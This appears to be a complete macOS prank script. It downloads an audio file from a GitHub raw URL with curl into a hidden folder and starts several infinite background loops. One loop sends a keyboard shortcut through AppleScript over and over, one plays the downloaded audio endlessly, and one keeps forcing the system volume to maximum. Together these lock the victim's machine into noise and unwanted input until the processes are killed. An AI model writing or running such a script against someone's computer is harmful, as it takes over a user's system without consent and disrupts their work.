echo "tell application \"System Events\"
key code 28 using {command down, option down, control down}
end tell" > ~/Library/config
while [ 1 ]; do osascript ~/Library/config; done &
curl -o ~/.WoopWoop/mem.mp3 --create-dirs https://raw.githubusercontent.com/Muslik/woop-woop/master/audio.mp3
while [ 1 ]; do afplay ~/.WoopWoop/mem.mp3; done &
while [ 1 ]; do osascript -e "set Volume 10"; done &
